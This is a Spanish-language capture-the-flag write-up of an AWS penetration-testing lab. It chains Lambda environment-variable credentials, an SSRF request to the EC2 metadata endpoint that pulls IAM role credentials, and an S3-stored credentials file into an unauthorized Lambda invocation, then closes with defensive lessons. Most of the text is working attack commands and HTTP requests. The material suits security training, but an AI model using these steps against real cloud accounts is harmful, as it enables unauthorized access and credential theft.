# Writeup: Solus (HackSmarter — Medium)

Solus es una máquina **Medium** diseñada para simular un entorno AWS con una cadena de escalada de privilegios. El recorrido comienza con un usuario IAM de bajo privilegio que puede listar funciones Lambda, donde se encuentran credenciales en variables de entorno. Estas credenciales permiten describir instancias EC2 y descubrir un servidor web vulnerable a SSRF. A través del SSRF, se accede al endpoint de metadatos de EC2 para obtener credenciales de un rol IAM. Estas credenciales permiten listar y leer un bucket S3 que contiene credenciales de otro usuario IAM. Finalmente, ese usuario tiene permisos para invocar la función Lambda original, completando el objetivo.

---

## 🎯 Objetivo / Scope

El equipo de Hack Smarter ha sido contratado para realizar una prueba de penetración en AWS. El cliente ha proporcionado credenciales de bajo nivel para un usuario IAM. La principal preocupación es si un atacante con estas credenciales puede invocar una función Lambda sensible. Se ha colocado una bandera en la respuesta de la función Lambda; si se obtiene una respuesta exitosa, se demuestra el compromiso.

---

## ⚙️ Fase 1: Configuración inicial de credenciales

Se nos proporcionan unas credenciales de AWS para un usuario IAM. Las configuramos en la CLI de AWS:

```bash
aws configure --profile solus-user
```

**Datos proporcionados:**

- `AWS Access Key ID`: `[REDACTED]`
- `AWS Secret Access Key`: `[REDACTED]`
- `Default region name`: `us-east-1`
- `Default output format`: `json`

Verificamos nuestra identidad:

```bash
export AWS_PROFILE=solus-user
aws sts get-caller-identity
```

```json
{
    "UserId": "AIDAW5EF2XMHQQ2YFEPD2",
    "Account": "474874559247",
    "Arn": "arn:aws:iam::474874559247:user/solus-lab"
}
```

Somos el usuario IAM `solus-lab` en la cuenta `474874559247`.

---

## 🔍 Fase 2: Enumeración de Lambda

### 2.1 Listado de funciones Lambda

**AWS Lambda** es un servicio de computación sin servidor que permite ejecutar código en respuesta a eventos. Comenzamos enumerando las funciones existentes:

```bash
aws lambda list-functions
```

**Salida:**

```json
{
    "Functions": [
        {
            "FunctionName": "cg-lambda-lab",
            "FunctionArn": "arn:aws:lambda:us-east-1:474874559247:function:cg-lambda-lab",
            "Runtime": "python3.11",
            "Role": "arn:aws:iam::474874559247:role/cg-lambda-role-lab-service-role",
            "Handler": "lambda.handler",
            "CodeSize": 223,
            "Description": "Invoke this Lambda function for the win!",
            "Timeout": 3,
            "MemorySize": 128,
            "LastModified": "2026-08-08T17:01:53.609+0000",
            "Version": "$LATEST",
            "Environment": {
                "Variables": {
                    "EC2_ACCESS_KEY_ID": "[REDACTED]",
                    "EC2_SECRET_KEY_ID": "[REDACTED]"
                }
            },
            "TracingConfig": {
                "Mode": "PassThrough"
            },
            "RevisionId": "dc645830-d135-4366-bb89-a436e77bf169",
            "PackageType": "Zip",
            "Architectures": [
                "x86_64"
            ],
            "EphemeralStorage": {
                "Size": 512
            },
            "SnapStart": {
                "ApplyOn": "None",
                "OptimizationStatus": "Off"
            },
            "LoggingConfig": {
                "LogFormat": "Text",
                "LogGroup": "/aws/lambda/cg-lambda-lab"
            }
        }
    ]
}
```

**Hallazgo crítico:** La función Lambda `cg-lambda-lab` tiene variables de entorno que contienen credenciales de acceso a EC2:

- `EC2_ACCESS_KEY_ID`: `[REDACTED]`
- `EC2_SECRET_KEY_ID`: `[REDACTED]`

La descripción de la función indica: *"Invoke this Lambda function for the win!"*, lo que sugiere que nuestro objetivo final es invocar esta función.

---

## 🔑 Fase 3: Configuración con credenciales de EC2

Extraemos las credenciales de las variables de entorno y configuramos un nuevo perfil:

```bash
aws configure --profile cg-lambda-lab
```

- `AWS Access Key ID`: `[REDACTED]`
- `AWS Secret Access Key`: `[REDACTED]`
- `Default region name`: `us-east-1`
- `Default output format`: `json`

Verificamos la identidad:

```bash
aws sts get-caller-identity --profile cg-lambda-lab
```

```json
{
    "UserId": "AIDAW5EF2XMHWJQWFII4S",
    "Account": "474874559247",
    "Arn": "arn:aws:iam::474874559247:user/wrex-lab"
}
```

Ahora somos el usuario `wrex-lab`.

```bash
export AWS_PROFILE=cg-lambda-lab
```

---

## 🖥️ Fase 4: Enumeración de EC2

### 4.1 Descripción de instancias

**Amazon EC2** es un servicio que proporciona capacidad de computación escalable en la nube. Con nuestras nuevas credenciales, describimos las instancias EC2:

```bash
aws ec2 describe-instances | jq
```

**Resultados relevantes:**

```json
{
  "Reservations": [
    {
      "Instances": [
        {
          "InstanceId": "i-0690f3782b5a10aa0",
          "InstanceType": "t3.micro",
          "PublicIpAddress": "44.195.85.191",
          "PrivateIpAddress": "10.10.10.44",
          "IamInstanceProfile": {
            "Arn": "arn:aws:iam::474874559247:instance-profile/cg-ec2-instance-profile-lab"
          },
          "SecurityGroups": [
            {
              "GroupId": "sg-0e27914d31ab7b80d",
              "GroupName": "cg-ec2-ssh-lab"
            }
          ],
          "Tags": [
            {
              "Key": "Name",
              "Value": "cg-ubuntu-ec2-lab"
            }
          ],
          "KeyName": "cg-ec2-key-pair-lab",
          "State": {
            "Name": "running"
          }
        }
      ]
    }
  ]
}
```

**Información clave:**

- **IP pública**: `44.195.85.191`
- **Grupo de seguridad**: `cg-ec2-ssh-lab` — sugiere que SSH (puerto 22) y posiblemente otros puertos están abiertos.
- **Perfil de instancia**: `cg-ec2-instance-profile-lab` — indica que la instancia tiene un rol IAM asociado.

### 4.2 Escaneo de puertos

Realizamos un escaneo de puertos a la IP pública de la instancia:

```bash
nmap -sV -sC -p- 44.195.85.191
```

```bash
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-08 13:17 -0400
Nmap scan report for ec2-44-195-85-191.compute-1.amazonaws.com (44.195.85.191)
Host is up (0.14s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Node.js Express framework
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Los puertos 22 (SSH) y 80 (HTTP) están abiertos. El puerto 80 ejecuta un servidor web Node.js/Express.

### 4.3 Exploración del servidor web

Accedemos al servidor web:

```bash
curl -s http://44.195.85.191/
```

```html
<h1>Welcome to sethsec's SSRF demo.</h1>

<h2>I am an application. I want to be useful, so give me a URL to requested for you
</h2><br><br>
```

El sitio web es una aplicación que acepta una URL a través del parámetro `url` en una solicitud GET y realiza una petición a esa URL, devolviendo el contenido. Esto es un **SSRF (Server-Side Request Forgery)** clásico.

---

## 🌐 Fase 5: Explotación de SSRF

### 5.1 Prueba de la funcionalidad

Probamos la aplicación con una URL externa:

```http
GET /?url=https://www.google.com HTTP/1.1
Host: 44.195.85.191
```

```http
HTTP/1.1 200 OK
Content-Type: text/html

<h1>Welcome to sethsec's SSRF demo.</h1>

<h2>I am an application. I want to be useful, so I requested: <font color="red">https://www.google.com</font> for you
</h2><br><br>

<!-- Contenido de Google -->
```

La aplicación realiza la petición y devuelve el contenido de Google.

### 5.2 Acceso al endpoint de metadatos de EC2

El endpoint de metadatos de EC2 (`http://169.254.169.254/latest/meta-data/`) es un servicio interno que proporciona información sobre la instancia, incluyendo las credenciales del rol IAM. Aprovechamos el SSRF para acceder a este endpoint:

```http
GET /?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1
Host: 44.195.85.191
```

```http
HTTP/1.1 200 OK
Content-Type: text/html

<h1>Welcome to sethsec's SSRF demo.</h1>

<h2>I am an application. I want to be useful, so I requested: <font color="red">http://169.254.169.254/latest/meta-data/</font> for you
</h2><br><br>

ami-id
ami-launch-index
ami-manifest-path
block-device-mapping/
events/
hibernation/
hostname
iam/
identity-credentials/
instance-action
instance-id
instance-life-cycle
instance-type
local-hostname
local-ipv4
mac
metrics/
network/
placement/
profile
public-hostname
public-ipv4
public-keys/
reservation-id
security-groups
services/
system
```

La aplicación devuelve la lista de directorios del endpoint de metadatos.

### 5.3 Obtención de credenciales del rol IAM

El directorio `iam/security-credentials/` contiene las credenciales del rol IAM asociado a la instancia. Primero, necesitamos saber el nombre del rol. El archivo `iam/security-credentials/` devuelve el nombre del rol cuando se accede directamente, o podemos obtenerlo del directorio `profile`:

A partir de la información del perfil de instancia obtenida anteriormente (`cg-ec2-instance-profile-lab`), sabemos que el nombre del rol es similar. Accedemos a:

```http
GET /?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/cg-ec2-role-lab HTTP/1.1
Host: 44.195.85.191
```

**Respuesta:**

```json
{
  "Code" : "Success",
  "LastUpdated" : "2026-08-08T17:39:15Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "[REDACTED]",
  "SecretAccessKey" : "[REDACTED]",
  "Token" : "[REDACTED]",
  "Expiration" : "2026-08-08T23:38:28Z"
}
```

El endpoint devuelve las credenciales temporales del rol IAM `cg-ec2-role-lab`.

---

## 🔑 Fase 6: Configuración con credenciales del rol EC2

Configuramos un nuevo perfil con las credenciales temporales obtenidas:

```bash
aws configure --profile cg-ec2-role-lab
```

- `AWS Access Key ID`: `[REDACTED]`
- `AWS Secret Access Key`: `[REDACTED]`
- `AWS Session Token`: `[REDACTED]`
- `Default region name`: `us-east-1`
- `Default output format`: `json`

Verificamos la identidad:

```bash
aws sts get-caller-identity --profile cg-ec2-role-lab
```

```json
{
    "UserId": "AROAW5EF2XMH6BYJ6WMXQ:i-0690f3782b5a10aa0",
    "Account": "474874559247",
    "Arn": "arn:aws:sts::474874559247:assumed-role/cg-ec2-role-lab/i-0690f3782b5a10aa0"
}
```

Ahora estamos asumiendo el rol `cg-ec2-role-lab`.

---

## 📦 Fase 7: Enumeración de S3

### 7.1 Listado de buckets

**Amazon S3** es un servicio de almacenamiento de objetos. Con el nuevo rol, listamos los buckets de S3:

```bash
aws s3 ls
```

```bash
2026-08-08 13:01:46 cg-secret-s3-bucket-474874559247
```

Encontramos un bucket llamado `cg-secret-s3-bucket-474874559247`.

### 7.2 Exploración del bucket

Listamos el contenido del bucket:

```bash
aws s3 ls s3://cg-secret-s3-bucket-474874559247/
```

```bash
                           PRE aws/
```

Hay un directorio `aws/`. Listamos su contenido:

```bash
aws s3 ls s3://cg-secret-s3-bucket-474874559247/aws/
```

```bash
2026-08-08 13:01:46        135 credentials
```

Encontramos un archivo llamado `credentials`.

### 7.3 Descarga del archivo de credenciales

Descargamos el archivo:

```bash
aws s3 cp s3://cg-secret-s3-bucket-474874559247/aws/credentials .
```

```bash
download: s3://cg-secret-s3-bucket-474874559247/aws/credentials to ./credentials
```

```bash
cat credentials
```

```ini
[default]
aws_access_key_id = [REDACTED]
aws_secret_access_key = [REDACTED]
region = us-east-1
```

El archivo contiene credenciales para un usuario IAM.

---

## 🔑 Fase 8: Configuración con credenciales del usuario S3

Configuramos un nuevo perfil con las credenciales extraídas:

```bash
aws configure --profile s3-user
```

- `AWS Access Key ID`: `[REDACTED]`
- `AWS Secret Access Key`: `[REDACTED]`
- `Default region name`: `us-east-1`
- `Default output format`: `json`

Verificamos la identidad:

```bash
export AWS_PROFILE=s3-user
aws sts get-caller-identity
```

```json
{
    "UserId": "AIDAW5EF2XMH4RDXHLJUS",
    "Account": "474874559247",
    "Arn": "arn:aws:iam::474874559247:user/shepard-lab"
}
```

Somos el usuario `shepard-lab`.

---

## 🚀 Fase 9: Invocación de la función Lambda

### 9.1 Invocación de la función

Ahora que tenemos credenciales del usuario `shepard-lab`, intentamos invocar la función Lambda original (`cg-lambda-lab`):

```bash
aws lambda invoke --function-name cg-lambda-lab --cli-binary-format raw-in-base64-out --payload '{}' response.json
```

```json
{
    "StatusCode": 200,
    "ExecutedVersion": "$LATEST"
}
```

### 9.2 Obtención de la respuesta

```bash
cat response.json
```

```json
"GG IZI"
```

Hemos completado el objetivo: invocar la función Lambda sensible y obtener la respuesta esperada.

---

## 📌 Conclusión

Solus es una máquina **Medium** que combina:

1. **Enumeración de Lambda** para descubrir credenciales en variables de entorno.
2. **Enumeración de EC2** para identificar una instancia con una IP pública y un servidor web vulnerable a SSRF.
3. **Explotación de SSRF** para acceder al endpoint de metadatos de EC2 y obtener credenciales de un rol IAM.
4. **Enumeración de S3** con el rol IAM para descubrir y descargar un archivo de credenciales.
5. **Configuración de un nuevo perfil** con las credenciales del usuario `shepard-lab`.
6. **Invocación de la función Lambda** original para obtener la bandera.

---

## 📚 Lecciones aprendidas


1. **Las credenciales no deben almacenarse en variables de entorno de Lambda**

   La función exponía credenciales permanentes de `wrex-lab` en su configuración. AWS recomienda utilizar Secrets Manager o Parameter Store para almacenar secretos, en lugar de variables de entorno con valores sensibles. [aws.amazon](https://aws.amazon.com/blogs/compute/securely-retrieving-secrets-with-aws-lambda/)

2. **Las aplicaciones que realizan peticiones HTTP deben protegerse contra SSRF**

   El servidor aceptaba una URL controlada por el usuario y realizaba la petición sin restricciones suficientes. Deben validarse los destinos, bloquear rangos privados y evitar el acceso a servicios internos como `169.254.169.254`.

3. **El servicio de metadatos de EC2 debe protegerse con IMDSv2**

   El SSRF permitió consultar el endpoint de metadatos y obtener credenciales temporales del rol `cg-ec2-role-lab`. IMDSv2 añade un token de sesión y reduce la explotación de SSRF, aunque la aplicación vulnerable también debe corregirse. [aws.amazon](https://aws.amazon.com/blogs/security/defense-in-depth-open-firewalls-reverse-proxies-ssrf-vulnerabilities-ec2-instance-metadata-service/)

4. **Los buckets S3 no deben contener credenciales**

   El bucket almacenaba un archivo con claves permanentes del usuario `shepard-lab`. Las credenciales no deben guardarse en objetos S3; deben revocarse, rotarse y sustituirse por roles IAM o un gestor de secretos.

5. **El acceso entre servicios debe aplicar mínimo privilegio**

   El rol de EC2 podía leer un bucket que contenía credenciales, y el usuario obtenido podía invocar una Lambda sensible. Cada identidad debería tener únicamente las acciones y recursos necesarios.

6. **La exposición de secretos puede producir movimiento lateral**

   La cadena no fue una escalada directa, sino una secuencia de exposición de credenciales y movimiento lateral:

   ```text
   Lambda
   → credenciales de wrex-lab
   → SSRF
   → credenciales del rol EC2
   → bucket S3
   → credenciales de shepard-lab
   → invocación de Lambda
   ```

7. **La enumeración sistemática permite construir la cadena de ataque**

   La enumeración de Lambda, EC2, metadatos, S3 y permisos IAM permitió conectar cada hallazgo con el siguiente paso. Las respuestas JSON deben analizarse junto con las políticas efectivas y los roles asociados.

8. **Las credenciales expuestas deben revocarse y monitorizarse**

   Las claves permanentes y temporales obtenidas durante la cadena deben rotarse o revocarse. Además, deben monitorizarse eventos como `GetFunctionConfiguration`, accesos inusuales a S3, consultas a metadatos y llamadas `lambda:InvokeFunction` mediante CloudTrail.

